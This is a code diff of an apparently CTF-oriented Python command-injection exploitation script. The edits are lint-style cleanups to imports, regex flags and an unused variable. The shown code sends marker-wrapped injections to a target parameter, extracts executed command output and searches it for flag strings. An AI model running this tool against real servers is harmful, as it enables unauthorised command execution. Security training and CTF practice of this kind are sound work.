@@ -9,9 +9,9 @@
 """
 import argparse
 import re
-import requests
 import sys
 
+import requests
 
 MARKER = "CMDI_MARKER"
 
@@ -49,7 +49,7 @@ def main():
     data = {k: v for k, v in (p.split("=", 1) for p in args.data.split("&") if p)} if args.data else {}
 
     # 1) 基线
-    base_status, base_len, base_text = _probe(args.url, args.method, headers, data, args.param, "BASELINE", args.timeout)
+    base_status, base_len, _ = _probe(args.url, args.method, headers, data, args.param, "BASELINE", args.timeout)
     print(f"[base] status={base_status} len={base_len}")
 
     # 2) 标记注入
@@ -73,14 +73,14 @@ def main():
         return 1
 
     # 提取命令输出：标记之间的内容
-    m = re.search(re.escape(MARKER) + r"(.+?)" + re.escape(MARKER), best, re.S)
+    m = re.search(re.escape(MARKER) + r"(.+?)" + re.escape(MARKER), best, re.DOTALL)
     if m:
         output = m.group(1).strip()
         print(f"[cmd_output]\n{output[:2000]}")
     else:
         output = best
 
-    flags = re.findall(r'flag\{[^}]+\}|FLAG_[A-Z0-9_]+|TSCT?\{[^}]+\}|\w{20,}', output, re.I)
+    flags = re.findall(r'flag\{[^}]+\}|FLAG_[A-Z0-9_]+|TSCT?\{[^}]+\}|\w{20,}', output, re.IGNORECASE)
     if flags:
         print(f"[flag_candidates] {flags[:10]}")
     return 0
